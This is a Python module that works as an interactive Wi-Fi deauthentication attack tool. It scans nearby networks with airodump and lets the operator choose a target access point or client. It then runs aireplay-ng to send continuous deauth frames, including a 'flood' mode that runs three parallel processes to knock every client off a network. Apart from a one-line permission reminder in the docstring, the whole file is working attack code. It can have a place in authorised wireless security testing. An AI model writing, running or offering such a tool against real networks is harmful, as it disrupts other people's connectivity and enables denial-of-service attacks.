#!/usr/bin/env python3
"""
Deauthentication module — send 802.11 deauth frames via aireplay-ng.
Use only on networks you own or have explicit permission to test.
"""

import subprocess
import signal
import time
import re
import sys
from wifi_monitor import (scan_wifi, find_wifi_interface, enable_monitor_mode,
                           disable_monitor_mode, get_monitor_interfaces,
                           _verify_monitor_mode)


def check_aireplay():
    """Check if aireplay-ng is available."""
    try:
        subprocess.run(["aireplay-ng", "--help"],
                       capture_output=True, timeout=5)
        return True
    except FileNotFoundError:
        print("[!] aireplay-ng not found. Install: sudo apt install aircrack-ng")
        return False


def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False, channel=None):
    """
    Send deauth frames.
    - bssid: target AP MAC
    - client_mac: specific client, or None to broadcast (kick everyone)
    - count: number of deauth packets (0 = continuous)
    - continuous: keep sending until Ctrl+C
    - channel: AP channel to tune interface before attack
    """
    # tune interface to AP channel first
    if channel:
        subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
                       capture_output=True, timeout=5)
        print(f"[*] Tuned {mon_iface} to channel {channel}")

    cmd = ["aireplay-ng",
           "--deauth", "0" if continuous else str(count),
           "-a", bssid]

    if client_mac:
        cmd += ["-c", client_mac]

    cmd.append(mon_iface)

    target = client_mac if client_mac else "broadcast (all clients)"
    print(f"[*] Deauth flood → {bssid}  target: {target}  [Ctrl+C to stop]")

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True)

    frames_sent = 0
    try:
        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            if "Sending DeAuth" in line or "Sending DeAuthentication" in line:
                frames_sent += 1
                print(f"\r[*] Frames: {frames_sent}", end="", flush=True)
            elif "Waiting for beacon" in line:
                print(f"    {line}")
            elif "more effective" in line or "connected wireless" in line:
                pass
            else:
                print(f"    {line}")
        proc.wait()
    except KeyboardInterrupt:
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()

    print(f"\n[+] Done. Sent {frames_sent} deauth frames")
    return frames_sent


def flood_deauth(mon_iface, bssid, channel, clients=None):
    """
    Flood deauth: 3 parallel aireplay-ng processes for maximum effect.
    - 1 broadcast process
    - 1 process per known client (up to 2)
    Press Ctrl+C to stop all.
    """
    if channel:
        subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
                       capture_output=True, timeout=5)
        print(f"[*] Channel {channel}")

    procs = []

    # broadcast process
    cmd_bc = ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface]
    procs.append(subprocess.Popen(cmd_bc, stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL))

    # per-client processes (up to 2 known clients)
    for c in (clients or [])[:2]:
        cmd_c = ["aireplay-ng", "--deauth", "0", "-a", bssid,
                 "-c", c["mac"], mon_iface]
        procs.append(subprocess.Popen(cmd_c, stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL))

    n = len(procs)
    print(f"[*] Running {n} deauth stream(s) → {bssid}  [Ctrl+C to stop]")

    frames = 0
    try:
        while True:
            time.sleep(0.5)
            frames += 1
            print(f"\r[*] Running... {frames}s", end="", flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        for p in procs:
            try:
                p.send_signal(signal.SIGINT)
                p.wait(timeout=2)
            except Exception:
                p.kill()

    print(f"\n[+] Stopped after {frames}s")


def deauth_menu(aps, clients, mon_iface):
    """Interactive deauth menu given scan results."""

    if not aps:
        print("[!] No networks found. Run Wi-Fi scan first.")
        return

    # show APs
    print(f"\n{'='*70}")
    print(f" Select target network")
    print(f"{'='*70}")
    print(f" {'#':<4}{'ESSID':<28}{'BSSID':<20}{'Ch':<5}{'Enc':<12}{'Signal'}")
    print(f" {'-'*2:<4}{'-'*26:<28}{'-'*17:<20}{'-'*3:<5}{'-'*10:<12}{'-'*8}")
    for i, ap in enumerate(aps, 1):
        essid = ap["essid"][:26] if ap["essid"] else "<hidden>"
        # show client count if any
        ap_client_count = len([c for c in clients if c["bssid"] == ap["bssid"]])
        clients_str = f"  [{ap_client_count} clients]" if ap_client_count else ""
        print(f" {i:<4}{essid:<28}{ap['bssid']:<20}{ap['channel']:<5}"
              f"{ap['encryption']:<12}{ap['power']} dBm{clients_str}")
    print(f" {'='*70}")
    print(" Enter number to deauth all clients, or q to cancel:")
    print(" (if clients visible — append client number, e.g. '2c1' = network 2, client 1)")

    choice = input("    > ").strip()
    if choice.lower() == "q":
        return

    # parse "2c1" style (network + client)
    client_mac = None
    m = re.match(r"(\d+)c(\d+)", choice)
    if m:
        net_num, cli_num = int(m.group(1)), int(m.group(2))
        try:
            ap = aps[net_num - 1]
        except IndexError:
            print("[!] Invalid network number")
            return
        ap_clients = [c for c in clients if c["bssid"] == ap["bssid"]]
        try:
            client_mac = ap_clients[cli_num - 1]["mac"]
        except IndexError:
            print("[!] Invalid client number, using broadcast")
    else:
        try:
            ap = aps[int(choice) - 1]
        except (ValueError, IndexError):
            print("[!] Invalid selection")
            return

    bssid = ap["bssid"]
    essid = ap["essid"] or "<hidden>"
    ap_clients = [c for c in clients if c["bssid"] == bssid]

    if client_mac:
        print(f"\n[!] Deauth {essid} → {client_mac}  [Ctrl+C to stop]")
        send_deauth(mon_iface, bssid, client_mac, count=0, continuous=True,
                    channel=ap.get("channel"))
    else:
        print(f"\n[!] Flood deauth {essid} ({bssid})  [Ctrl+C to stop]")
        flood_deauth(mon_iface, bssid, ap.get("channel"), ap_clients)


def interactive_deauth():
    """Full interactive deauth flow: scan → select → deauth."""
    if not check_aireplay():
        return

    # check for existing monitor interface
    mon_interfaces = get_monitor_interfaces()
    mon_iface = None
    need_disable = False

    if mon_interfaces:
        mon_iface = mon_interfaces[0]
        print(f"[*] Using existing monitor interface: {mon_iface}")
    else:
        iface = find_wifi_interface()
        if not iface:
            print("[!] No Wi-Fi adapter found")
            return

        print(f"[*] Found adapter: {iface}")
        mon_iface = enable_monitor_mode(iface)
        need_disable = True

    if not _verify_monitor_mode(mon_iface):
        print(f"[!] {mon_iface} is not in monitor mode")
        return

    print(f"\n[*] Scanning for 15s to find targets...")

    from wifi_monitor import run_airodump, parse_airodump_csv, print_wifi_results
    csv_path = run_airodump(mon_iface, 15)
    aps, clients = parse_airodump_csv(csv_path)

    if not aps:
        print("[!] No networks found during scan")
        if need_disable:
            disable_monitor_mode(mon_iface)
        return

    print_wifi_results(aps, clients)

    # deauth loop — allow multiple attacks
    while True:
        deauth_menu(aps, clients, mon_iface)
        print("\n[?] Deauth another target? (y/n)")
        if input("    > ").strip().lower() != "y":
            break

    if need_disable:
        disable_monitor_mode(mon_iface)
